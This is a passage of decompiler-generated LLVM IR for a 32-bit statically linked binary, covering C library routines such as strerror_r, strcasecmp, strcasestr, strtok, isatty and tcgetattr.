  %v0_8052451 = phi i32 [ %v0_805246b, %dec_label_pc_805244d.preheader ], [ %v1_805243d, %dec_label_pc_805243d ], [ %v1_8052449, %dec_label_pc_8052449 ]
  %v1_8052451 = add i32 %v0_8052451, 1
  br label %dec_label_pc_8052458

dec_label_pc_8052458:                             ; preds = %dec_label_pc_8052425, %dec_label_pc_8052451
  %v0_805244d27.in.in.in = phi i32 [ %v1_8052451, %dec_label_pc_8052451 ], [ %v1_8052425, %dec_label_pc_8052425 ]
  %v0_805246b = phi i32 [ %v1_8052451, %dec_label_pc_8052451 ], [ %v1_8052425, %dec_label_pc_8052425 ]
  %v0_805244d27.in.in = inttoptr i32 %v0_805244d27.in.in.in to i8*
  %v0_805244d27.in = load i8, i8* %v0_805244d27.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_805244d27.in, %v3_805241a
  %v1_8052458 = icmp eq i1 %storemerge4, false
  br i1 %v1_8052458, label %dec_label_pc_805244d.preheader, label %dec_label_pc_805245a

dec_label_pc_805245a:                             ; preds = %dec_label_pc_8052458
  %v1_8052462 = add i32 %v0_805246b, 1
  %v2_8052462 = inttoptr i32 %v1_8052462 to i8*
  %v3_8052462 = load i8, i8* %v2_8052462, align 1
  %v3_8052466 = load i8, i8* %v2_8052466, align 1
  %v1_805246e = add i32 %v0_805246b, -1
  %v12_8052471 = icmp eq i8 %v3_8052462, %v3_8052466
  %v1_8052473 = icmp eq i1 %v12_8052471, false
  br i1 %v1_8052473, label %dec_label_pc_805249d, label %dec_label_pc_8052475.preheader

dec_label_pc_8052475.preheader:                   ; preds = %dec_label_pc_805245a
  %v1_805247510 = icmp eq i8 %v3_8052462, 0
  br i1 %v1_805247510, label %dec_label_pc_80524a7, label %dec_label_pc_8052479

dec_label_pc_8052479:                             ; preds = %dec_label_pc_8052475.preheader, %dec_label_pc_8052499
  %v0_805248c = phi i32 [ %v1_805248c, %dec_label_pc_8052499 ], [ %v1_8052466, %dec_label_pc_8052475.preheader ]
  %v0_8052489 = phi i32 [ %v1_8052489, %dec_label_pc_8052499 ], [ %v1_8052462, %dec_label_pc_8052475.preheader ]
  %v1_8052479 = add i32 %v0_8052489, 1
  %v2_8052479 = inttoptr i32 %v1_8052479 to i8*
  %v3_8052479 = load i8, i8* %v2_8052479, align 1
  %v1_805247d = add i32 %v0_805248c, 1
  %v2_805247d = inttoptr i32 %v1_805247d to i8*
  %v3_805247d = load i8, i8* %v2_805247d, align 1
  %v12_8052481 = icmp eq i8 %v3_8052479, %v3_805247d
  %v1_8052483 = icmp eq i1 %v12_8052481, false
  br i1 %v1_8052483, label %dec_label_pc_805249d, label %dec_label_pc_8052485

dec_label_pc_8052485:                             ; preds = %dec_label_pc_8052479
  %v1_8052485 = icmp eq i8 %v3_805247d, 0
  br i1 %v1_8052485, label %dec_label_pc_80524a7, label %dec_label_pc_8052489

dec_label_pc_8052489:                             ; preds = %dec_label_pc_8052485
  %v1_8052489 = add i32 %v0_8052489, 2
  %v1_805248c = add i32 %v0_805248c, 2
  %v1_805248f = inttoptr i32 %v1_8052489 to i8*
  %v2_805248f = load i8, i8* %v1_805248f, align 1
  %v1_8052492 = inttoptr i32 %v1_805248c to i8*
  %v2_8052492 = load i8, i8* %v1_8052492, align 1
  %v12_8052495 = icmp eq i8 %v2_805248f, %v2_8052492
  %v1_8052497 = icmp eq i1 %v12_8052495, false
  br i1 %v1_8052497, label %dec_label_pc_805249d, label %dec_label_pc_8052499

dec_label_pc_8052499:                             ; preds = %dec_label_pc_8052489
  %v1_8052475 = icmp eq i8 %v2_8052492, 0
  br i1 %v1_8052475, label %dec_label_pc_80524a7, label %dec_label_pc_8052479

dec_label_pc_805249d:                             ; preds = %dec_label_pc_8052489, %dec_label_pc_8052479, %dec_label_pc_805245a
  %v0_805249d.in = phi i8 [ %v3_8052466, %dec_label_pc_805245a ], [ %v2_8052492, %dec_label_pc_8052489 ], [ %v3_805247d, %dec_label_pc_8052479 ]
  %v1_805249d = icmp eq i8 %v0_805249d.in, 0
  %v1_805249f = icmp eq i1 %v1_805249d, false
  br i1 %v1_805249f, label %dec_label_pc_8052430, label %dec_label_pc_80524a7

dec_label_pc_80524a5:                             ; preds = %dec_label_pc_8052403, %dec_label_pc_8052445, %dec_label_pc_8052439
  br label %dec_label_pc_80524a7

dec_label_pc_80524a7:                             ; preds = %dec_label_pc_8052475.preheader, %dec_label_pc_805249d, %dec_label_pc_8052485, %dec_label_pc_8052499, %entry, %dec_label_pc_8052413, %dec_label_pc_80524a5
  %storemerge2 = phi i32 [ 0, %dec_label_pc_80524a5 ], [ %v1_8052403, %dec_label_pc_8052413 ], [ %arg1, %entry ], [ %v1_805246e, %dec_label_pc_8052499 ], [ %v1_805246e, %dec_label_pc_8052485 ], [ %v1_805246e, %dec_label_pc_805249d ], [ %v1_805246e, %dec_label_pc_8052475.preheader ]
  store i32 %v0_80523eb, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_8052492, { 0, 2, 1 }
  uselistorder i32 %v1_805248c, { 1, 0 }
  uselistorder i32 %v1_8052489, { 1, 0 }
  uselistorder i8 %v3_805247d, { 0, 2, 1 }
  uselistorder i8 %v3_8052462, { 1, 0 }
  uselistorder i32 %v0_805246b, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_8052451, { 1, 0 }
  uselistorder i8 %v2_805244a, { 1, 0 }
  uselistorder i32 %v1_8052449, { 0, 2, 1 }
  uselistorder i8 %v2_805243e, { 1, 0 }
  uselistorder i32 %v0_805243d56, { 1, 0 }
  uselistorder i32 %v1_8052425, { 1, 0 }
  uselistorder i32 %v1_8052403, { 0, 2, 1 }
  uselistorder i8 %v2_80523f7, { 1, 2, 0, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80524a7, { 6, 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_80524a5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052479, { 1, 0 }
  uselistorder label %dec_label_pc_8052458, { 1, 0 }
  uselistorder label %dec_label_pc_8052439, { 1, 0 }
  uselistorder label %dec_label_pc_805244d.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_80524c1 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_80524c6 = load i32, i32* @ebx, align 4
  ret i32 %v0_80524c6
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_80524e2 = icmp ugt i32 %arg1, 124
  br i1 %v6_80524e2, label %dec_label_pc_80524ff, label %dec_label_pc_80524e4

dec_label_pc_80524e4:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8059900.489 to i32), i32* @esi, align 4
  %v1_80524f44 = icmp eq i32 %arg1, 0
  %v1_80524f611 = icmp eq i1 %v1_80524f44, false
  br i1 %v1_80524f611, label %dec_label_pc_80524ed, label %dec_label_pc_80524f8

dec_label_pc_80524ed:                             ; preds = %dec_label_pc_80524e4, %dec_label_pc_80524ed
  %v0_80524f0 = phi i32 [ %v3_80524f0, %dec_label_pc_80524ed ], [ %arg1, %dec_label_pc_80524e4 ]
  %v0_80524f3 = phi i32 [ %v1_80524f3, %dec_label_pc_80524ed ], [ ptrtoint ([8 x i8]* @global_var_8059900.489 to i32), %dec_label_pc_80524e4 ]
  %v1_80524ed = inttoptr i32 %v0_80524f3 to i8*
  %v2_80524ed = load i8, i8* %v1_80524ed, align 1
  %v7_80524ed = icmp eq i8 %v2_80524ed, 0
  %v2_80524f0 = zext i1 %v7_80524ed to i32
  %v3_80524f0 = add i32 %v2_80524f0, %v0_80524f0
  %v16_80524f0 = icmp eq i32 %v3_80524f0, 0
  %v1_80524f3 = add i32 %v0_80524f3, 1
  store i32 %v1_80524f3, i32* @esi, align 4
  %v1_80524f6 = icmp eq i1 %v16_80524f0, false
  br i1 %v1_80524f6, label %dec_label_pc_80524ed, label %dec_label_pc_80524f8

dec_label_pc_80524f8:                             ; preds = %dec_label_pc_80524ed, %dec_label_pc_80524e4
  %v0_80524fa = phi i32 [ ptrtoint ([8 x i8]* @global_var_8059900.489 to i32), %dec_label_pc_80524e4 ], [ %v1_80524f3, %dec_label_pc_80524ed ]
  store i32 0, i32* @ebp, align 4
  %v1_80524fa = inttoptr i32 %v0_80524fa to i8*
  %v2_80524fa = load i8, i8* %v1_80524fa, align 1
  %v3_80524fa = icmp eq i8 %v2_80524fa, 0
  %v1_80524fd = icmp eq i1 %v3_80524fa, false
  br i1 %v1_80524fd, label %dec_label_pc_80524f8.dec_label_pc_805252e_crit_edge, label %dec_label_pc_80524ff

dec_label_pc_80524f8.dec_label_pc_805252e_crit_edge: ; preds = %dec_label_pc_80524f8
  br label %dec_label_pc_805252e

dec_label_pc_80524ff:                             ; preds = %dec_label_pc_80524f8, %entry
  store i32 22, i32* @ebp, align 4
  %v1_8052507 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_8052513 = bitcast i32* %stack_var_-17 to i8*
  %v7_8052513 = call i32 @_uintmaxtostr(i8* %v6_8052513, i32 %arg1, i32 %v1_8052507, i32 -10, i32 0)
  %v1_805251b = add i32 %v7_8052513, -14
  store i32 %v1_805251b, i32* @esi, align 4
  %v5_8052525 = inttoptr i32 %v1_805251b to i8*
  store i8* %v5_8052525, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_805251b to i16*
  %v6_8052526 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_80598d6.490 to i32), i32 14)
  %v0_805253d.pre = load i32, i32* @edi, align 4
  %v0_805253f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805252e

dec_label_pc_805252e:                             ; preds = %dec_label_pc_80524f8.dec_label_pc_805252e_crit_edge, %dec_label_pc_80524ff
  %v0_805253f = phi i32 [ %v0_80524fa, %dec_label_pc_80524f8.dec_label_pc_805252e_crit_edge ], [ %v0_805253f.pre, %dec_label_pc_80524ff ]
  %v0_805253d = phi i32 [ %arg3, %dec_label_pc_80524f8.dec_label_pc_805252e_crit_edge ], [ %v0_805253d.pre, %dec_label_pc_80524ff ]
  %v4_8052530 = icmp eq i32 %arg2, 0
  %v1_8052535 = icmp eq i1 %v4_8052530, false
  %v2_805253d = select i1 %v1_8052535, i32 %v0_805253d, i32 0
  store i32 %v2_805253d, i32* @edi, align 4
  %v5_805253f = inttoptr i32 %v0_805253f to i8*
  store i8* %v5_805253f, i8** %stack_var_-108, align 4
  %v3_8052540 = call i32 @strlen(i8* %v5_805253f)
  %v1_8052548 = add i32 %v3_8052540, 1
  store i32 %v1_8052548, i32* %ebx.global-to-local, align 4
  %v1_805254b = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_8052548, %v1_805254b
  br i1 %tmp46, label %dec_label_pc_805254f, label %dec_label_pc_8052556

dec_label_pc_805254f:                             ; preds = %dec_label_pc_805252e
  store i32 %v1_805254b, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_8052556

dec_label_pc_8052556:                             ; preds = %dec_label_pc_805252e, %dec_label_pc_805254f
  %v0_805255b = phi i32 [ %v1_8052548, %dec_label_pc_805252e ], [ %v1_805254b, %dec_label_pc_805254f ]
  %v1_8052556 = icmp eq i32 %v0_805255b, 0
  br i1 %v1_8052556, label %dec_label_pc_8052572, label %dec_label_pc_805255a

dec_label_pc_805255a:                             ; preds = %dec_label_pc_8052556
  %v0_805255c = load i32, i32* @esi, align 4
  %v8_805255d = inttoptr i32 %arg2 to i8*
  store i8* %v8_805255d, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_8052561 = call i32 @memcpy(i16* %tmp45, i32 %v0_805255c, i32 %v0_805255b)
  %v1_805256d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805256d = add i32 %arg2, -1
  %v3_805256d = add i32 %v2_805256d, %v1_805256d
  %v4_805256d = inttoptr i32 %v3_805256d to i8*
  store i8 0, i8* %v4_805256d, align 1
  br label %dec_label_pc_8052572

dec_label_pc_8052572:                             ; preds = %dec_label_pc_8052556, %dec_label_pc_805255a
  %v0_8052572 = load i32, i32* @ebp, align 4
  %v1_8052572 = icmp eq i32 %v0_8052572, 0
  br i1 %v1_8052572, label %dec_label_pc_805257d, label %dec_label_pc_8052576

dec_label_pc_8052576:                             ; preds = %dec_label_pc_8052572
  %v0_8052576 = load i8*, i8** %stack_var_-108, align 4
  %v1_8052576 = ptrtoint i8* %v0_8052576 to i32
  %v2_8052576 = call i32 @__errno_location(i32 %v1_8052576)
  %v0_805257b = load i32, i32* @ebp, align 4
  %v2_805257b = inttoptr i32 %v2_8052576 to i32*
  store i32 %v0_805257b, i32* %v2_805257b, align 4
  %v0_8052580.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805257d

dec_label_pc_805257d:                             ; preds = %dec_label_pc_8052572, %dec_label_pc_8052576
  %v0_8052580 = phi i32 [ 0, %dec_label_pc_8052572 ], [ %v0_8052580.pre, %dec_label_pc_8052576 ]
  ret i32 %v0_8052580

; uselistorder directives
  uselistorder i32 %v1_805254b, { 1, 2, 0 }
  uselistorder i32 %v1_8052548, { 1, 0, 2 }
  uselistorder i32 %v1_805251b, { 1, 0, 2 }
  uselistorder i32 %v1_80524f3, { 0, 2, 1 }
  uselistorder i32 %v3_80524f0, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8059900.489 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_805257d, { 1, 0 }
  uselistorder label %dec_label_pc_8052572, { 1, 0 }
  uselistorder label %dec_label_pc_8052556, { 1, 0 }
  uselistorder label %dec_label_pc_805252e, { 1, 0 }
  uselistorder label %dec_label_pc_80524ed, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8052598 = inttoptr i32 %arg2 to i8*
  %v3_8052598 = call i32 @memmove(i8* %v2_8052598, i32 %arg1)
  ret i32 %v3_8052598
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80525a2 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80525a2, i32* @ecx, align 4
  %v0_80525ac = load i32, i32* bitcast (i32** @global_var_805b4e0.492 to i32*), align 32
  br label %dec_label_pc_80525b2

dec_label_pc_80525b2:                             ; preds = %dec_label_pc_80525cf, %entry
  %v0_80525d56 = phi i32 [ %v0_80525d57, %dec_label_pc_80525cf ], [ 0, %entry ]
  %v0_80525cf = phi i32 [ %v1_80525cf, %dec_label_pc_80525cf ], [ %arg2, %entry ]
  %v0_80525d0 = phi i32 [ %v1_80525d0, %dec_label_pc_80525cf ], [ %v4_80525a2, %entry ]
  %v12_80525b2 = icmp eq i32 %v0_80525d0, %v0_80525cf
  %.pre = inttoptr i32 %v0_80525d0 to i8*
  br i1 %v12_80525b2, label %dec_label_pc_80525ca, label %dec_label_pc_80525b6

dec_label_pc_80525b6:                             ; preds = %dec_label_pc_80525b2
  %v2_80525b6 = load i8, i8* %.pre, align 1
  %v3_80525b6 = zext i8 %v2_80525b6 to i32
  %v2_80525b9 = mul nuw nsw i32 %v3_80525b6, 2
  %v3_80525b9 = add i32 %v2_80525b9, %v0_80525ac
  %v4_80525b9 = inttoptr i32 %v3_80525b9 to i16*
  %v5_80525b9 = load i16, i16* %v4_80525b9, align 2
  %v6_80525b9 = sext i16 %v5_80525b9 to i32
  %v1_80525bd = inttoptr i32 %v0_80525cf to i8*
  %v2_80525bd = load i8, i8* %v1_80525bd, align 1
  %v3_80525bd = zext i8 %v2_80525bd to i32
  %v2_80525c0 = mul nuw nsw i32 %v3_80525bd, 2
  %v3_80525c0 = add i32 %v2_80525c0, %v0_80525ac
  %v4_80525c0 = inttoptr i32 %v3_80525c0 to i16*
  %v5_80525c0 = load i16, i16* %v4_80525c0, align 2
  %v6_80525c0 = sext i16 %v5_80525c0 to i32
  %v2_80525c4 = sub nsw i32 %v6_80525b9, %v6_80525c0
  %v12_80525c4 = icmp eq i32 %v2_80525c4, 0
  store i32 %v2_80525c4, i32* @edx, align 4
  %v1_80525c8 = icmp eq i1 %v12_80525c4, false
  br i1 %v1_80525c8, label %dec_label_pc_80525d3, label %dec_label_pc_80525ca

dec_label_pc_80525ca:                             ; preds = %dec_label_pc_80525b2, %dec_label_pc_80525b6
  %v0_80525d57 = phi i32 [ %v2_80525c4, %dec_label_pc_80525b6 ], [ %v0_80525d56, %dec_label_pc_80525b2 ]
  %v2_80525ca = load i8, i8* %.pre, align 1
  %v3_80525ca = icmp eq i8 %v2_80525ca, 0
  br i1 %v3_80525ca, label %dec_label_pc_80525d3, label %dec_label_pc_80525cf

dec_label_pc_80525cf:                             ; preds = %dec_label_pc_80525ca
  %v1_80525cf = add i32 %v0_80525cf, 1
  %v1_80525d0 = add i32 %v0_80525d0, 1
  store i32 %v1_80525d0, i32* @ecx, align 4
  br label %dec_label_pc_80525b2

dec_label_pc_80525d3:                             ; preds = %dec_label_pc_80525ca, %dec_label_pc_80525b6
  %v0_80525d5 = phi i32 [ %v0_80525d57, %dec_label_pc_80525ca ], [ %v2_80525c4, %dec_label_pc_80525b6 ]
  ret i32 %v0_80525d5

; uselistorder directives
  uselistorder i32 %v1_80525d0, { 1, 0 }
  uselistorder i32 %v0_80525d57, { 1, 0 }
  uselistorder i32 %v2_80525c4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80525d0, { 2, 1, 0 }
  uselistorder i32 %v0_80525cf, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80525ca, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80525db = load i32, i32* @ebx, align 4
  %v4_80525df = ptrtoint i8* %arg1 to i32
  %v1_80525eb18 = inttoptr i32 %arg2 to i8*
  %v2_80525eb1931 = load i8, i8* %v1_80525eb18, align 1
  %v4_80525ed2335 = icmp eq i8 %v2_80525eb1931, 0
  %v1_80525ef2436 = icmp eq i1 %v4_80525ed2335, false
  br i1 %v1_80525ef2436, label %dec_label_pc_80525f5.lr.ph.lr.ph, label %dec_label_pc_8052625

dec_label_pc_80525f5.lr.ph.lr.ph:                 ; preds = %entry
  %v3_80525eb2032 = zext i8 %v2_80525eb1931 to i32
  %v4_80525eb.pre.pre = load i32, i32* @eax, align 4
  %v5_80525eb2133 = and i32 %v4_80525eb.pre.pre, -256
  %v6_80525eb2234 = or i32 %v3_80525eb2032, %v5_80525eb2133
  %v4_80525f5.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80525f5.lr.ph

dec_label_pc_80525f5.lr.ph:                       ; preds = %dec_label_pc_80525f5.lr.ph.lr.ph, %dec_label_pc_8052620
  %v4_80525f5.pre = phi i32 [ %v4_80525f5.pre.pre, %dec_label_pc_80525f5.lr.ph.lr.ph ], [ %v0_8052602, %dec_label_pc_8052620 ]
  %v6_80525eb2239 = phi i32 [ %v6_80525eb2234, %dec_label_pc_80525f5.lr.ph.lr.ph ], [ %v6_80525eb22, %dec_label_pc_8052620 ]
  %v2_80525eb1938 = phi i8 [ %v2_80525eb1931, %dec_label_pc_80525f5.lr.ph.lr.ph ], [ %v2_80525eb19, %dec_label_pc_8052620 ]
  %v0_805262037 = phi i32 [ %v4_80525df, %dec_label_pc_80525f5.lr.ph.lr.ph ], [ %v1_8052620, %dec_label_pc_8052620 ]
  br label %dec_label_pc_80525f5

dec_label_pc_80525f5:                             ; preds = %dec_label_pc_80525f5.lr.ph, %dec_label_pc_8052615
  %v4_80525f5 = phi i32 [ %v4_80525f5.pre, %dec_label_pc_80525f5.lr.ph ], [ %v4_80525f544, %dec_label_pc_8052615 ]
  %v6_80525eb29 = phi i32 [ %v6_80525eb2239, %dec_label_pc_80525f5.lr.ph ], [ %v6_80525eb, %dec_label_pc_8052615 ]
  %v2_80525eb28 = phi i8 [ %v2_80525eb1938, %dec_label_pc_80525f5.lr.ph ], [ %v2_80525eb, %dec_label_pc_8052615 ]
  %v1_80525eb27 = phi i8* [ %v1_80525eb18, %dec_label_pc_80525f5.lr.ph ], [ %v1_80525eb, %dec_label_pc_8052615 ]
  %v0_805261526 = phi i32 [ %arg2, %dec_label_pc_80525f5.lr.ph ], [ %v1_8052615, %dec_label_pc_8052615 ]
  %v0_805261625 = phi i32 [ %v0_805262037, %dec_label_pc_80525f5.lr.ph ], [ %v1_8052616, %dec_label_pc_8052615 ]
  %v1_80525f5 = inttoptr i32 %v0_805261625 to i8*
  %v2_80525f5 = load i8, i8* %v1_80525f5, align 1
  %v3_80525f5 = zext i8 %v2_80525f5 to i32
  %v5_80525f5 = and i32 %v4_80525f5, -256
  %v6_80525f5 = or i32 %v5_80525f5, %v3_80525f5
  %v15_80525fb = icmp eq i8 %v2_80525eb28, %v2_80525f5
  br i1 %v15_80525fb, label %dec_label_pc_8052615, label %dec_label_pc_80525ff

dec_label_pc_80525ff:                             ; preds = %dec_label_pc_80525f5
  %v2_80525ff = load i8, i8* %v1_80525f5, align 1
  %v3_80525ff = zext i8 %v2_80525ff to i32
  %v0_8052602 = load i32, i32* bitcast (i32** @global_var_805b4e0.492 to i32*), align 32
  %v2_8052608 = load i8, i8* %v1_80525eb27, align 1
  %v3_8052608 = zext i8 %v2_8052608 to i32
  %v2_805260b = mul nuw nsw i32 %v3_80525ff, 2
  %v3_805260b = add i32 %v2_805260b, %v0_8052602
  %v4_805260b = inttoptr i32 %v3_805260b to i16*
  %v5_805260b = load i16, i16* %v4_805260b, align 2
  %v6_805260b = zext i16 %v5_805260b to i32
  %v4_805260f = mul nuw nsw i32 %v3_8052608, 2
  %v5_805260f = add i32 %v4_805260f, %v0_8052602
  %v6_805260f = inttoptr i32 %v5_805260f to i16*
  %v7_805260f = load i16, i16* %v6_805260f, align 2
  %v18_805260f = icmp eq i16 %v5_805260b, %v7_805260f
  %v1_8052613 = icmp eq i1 %v18_805260f, false
  br i1 %v1_8052613, label %dec_label_pc_8052619, label %dec_label_pc_8052615

dec_label_pc_8052615:                             ; preds = %dec_label_pc_80525ff, %dec_label_pc_80525f5
  %v4_80525f544 = phi i32 [ %v0_8052602, %dec_label_pc_80525ff ], [ %v6_80525f5, %dec_label_pc_80525f5 ]
  %v4_80525eb6 = phi i32 [ %v6_805260b, %dec_label_pc_80525ff ], [ %v6_80525eb29, %dec_label_pc_80525f5 ]
  %v1_8052615 = add i32 %v0_805261526, 1
  %v1_8052616 = add i32 %v0_805261625, 1
  %v1_80525eb = inttoptr i32 %v1_8052615 to i8*
  %v2_80525eb = load i8, i8* %v1_80525eb, align 1
  %v3_80525eb = zext i8 %v2_80525eb to i32
  %v5_80525eb = and i32 %v4_80525eb6, -256
  %v6_80525eb = or i32 %v3_80525eb, %v5_80525eb
  %v4_80525ed = icmp eq i8 %v2_80525eb, 0
  %v1_80525ef = icmp eq i1 %v4_80525ed, false
  br i1 %v1_80525ef, label %dec_label_pc_80525f5, label %dec_label_pc_8052625

dec_label_pc_8052619:                             ; preds = %dec_label_pc_80525ff
  %v4_8052619 = icmp eq i8 %v2_80525f5, 0
  br i1 %v4_8052619, label %dec_label_pc_8052623, label %dec_label_pc_8052620

dec_label_pc_8052620:                             ; preds = %dec_label_pc_8052619
  %v1_8052620 = add i32 %v0_805262037, 1
  %v2_80525eb19 = load i8, i8* %v1_80525eb18, align 1
  %v3_80525eb20 = zext i8 %v2_80525eb19 to i32
  %v5_80525eb21 = and i32 %v6_805260b, 65280
  %v6_80525eb22 = or i32 %v3_80525eb20, %v5_80525eb21
  %v4_80525ed23 = icmp eq i8 %v2_80525eb19, 0
  %v1_80525ef24 = icmp eq i1 %v4_80525ed23, false
  br i1 %v1_80525ef24, label %dec_label_pc_80525f5.lr.ph, label %dec_label_pc_8052625

dec_label_pc_8052623:                             ; preds = %dec_label_pc_8052619
  br label %dec_label_pc_8052625

dec_label_pc_8052625:                             ; preds = %dec_label_pc_8052620, %entry, %dec_label_pc_8052615, %dec_label_pc_8052623
  %storemerge = phi i32 [ 0, %dec_label_pc_8052623 ], [ %v4_80525df, %entry ], [ %v1_8052620, %dec_label_pc_8052620 ], [ %v0_805262037, %dec_label_pc_8052615 ]
  store i32 %v0_80525db, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_80525eb19, { 1, 2, 0 }
  uselistorder i8 %v2_80525eb, { 1, 2, 0 }
  uselistorder i8* %v1_80525eb, { 1, 0 }
  uselistorder i32 %v0_8052602, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805261625, { 1, 0 }
  uselistorder i8 %v2_80525eb1931, { 0, 2, 1 }
  uselistorder i8* %v1_80525eb18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052625, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80525f5, { 1, 0 }
  uselistorder label %dec_label_pc_80525f5.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_805263c = inttoptr i32 %arg1 to i8*
  %v4_805263c = call i32 @strtok_r(i8* %v3_805263c, i32 %arg2, i32 ptrtoint (i32* @global_var_8061560.493 to i32))
  ret i32 %v4_805263c
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_8052654 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8052659 = icmp eq i32 %v3_8052654, 0
  %v1_805265b = zext i1 %v1_8052659 to i32
  ret i32 %v1_805265b
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052668 = load i32, i32* @esi, align 4
  %v0_8052669 = load i32, i32* @ebx, align 4
  store i32 %v0_8052669, i32* %stack_var_-8, align 4
  %v2_805266d = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805266d, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_805267f = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_805266d)
  store i32 %v3_805267f, i32* %eax.global-to-local, align 4
  store i32 %v3_805267f, i32* @esi, align 4
  %v1_8052689 = icmp eq i32 %v3_805267f, 0
  %v1_805268b = icmp eq i1 %v1_8052689, false
  br i1 %v1_805268b, label %dec_label_pc_80526d0, label %dec_label_pc_805268d

dec_label_pc_805268d:                             ; preds = %entry
  %v3_805268d = load i32, i32* %stack_var_-44, align 4
  %v1_8052691 = load i32, i32* @ebx, align 4
  %v2_8052691 = inttoptr i32 %v1_8052691 to i32*
  store i32 %v3_805268d, i32* %v2_8052691, align 4
  %v1_8052697 = load i32, i32* @ebx, align 4
  %v2_8052697 = add i32 %v1_8052697, 4
  %v3_8052697 = inttoptr i32 %v2_8052697 to i32*
  %v1_805269e = load i32, i32* @ebx, align 4
  %v2_805269e = add i32 %v1_805269e, 8
  %v3_805269e = inttoptr i32 %v2_805269e to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_80526a5 = load i32, i32* @ebx, align 4
  %v2_80526a5 = add i32 %v1_80526a5, 12
  %v3_80526a5 = inttoptr i32 %v2_80526a5 to i32*
  store i32 %tmp3, i32* %v3_80526a5, align 4
  %v4_80526a8 = zext i8 %tmp to i32
  %v5_80526a8 = load i32, i32* %eax.global-to-local, align 4
  %v6_80526a8 = and i32 %v5_80526a8, -256
  %v7_80526a8 = or i32 %v6_80526a8, %v4_80526a8
  store i32 %v7_80526a8, i32* %eax.global-to-local, align 4
  %v2_80526ac = load i32, i32* @ebx, align 4
  %v3_80526ac = add i32 %v2_80526ac, 16
  %v4_80526ac = inttoptr i32 %v3_80526ac to i8*
  store i8 %tmp, i8* %v4_80526ac, align 1
  %v0_80526af = load i32, i32* %eax.global-to-local, align 4
  %v2_80526b2 = ptrtoint i32* %stack_var_-27 to i32
  %v0_80526b7 = load i32, i32* @ebx, align 4
  %v1_80526b7 = add i32 %v0_80526b7, 17
  store i32 %v1_80526b7, i32* %eax.global-to-local, align 4
  %v4_80526bb = call i32 @__GI_mempcpy(i32 %v1_80526b7, i32 %v2_80526b2, i32 19, i32 %v0_80526af)
  store i32 %v4_80526bb, i32* %eax.global-to-local, align 4
  %v3_80526c8 = inttoptr i32 %v4_80526bb to i8*
  %v4_80526c8 = call i32 @__GI_memset(i8* %v3_80526c8, i32 0, i32 13)
  store i32 %v4_80526c8, i32* %eax.global-to-local, align 4
  %v0_80526d0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80526d0

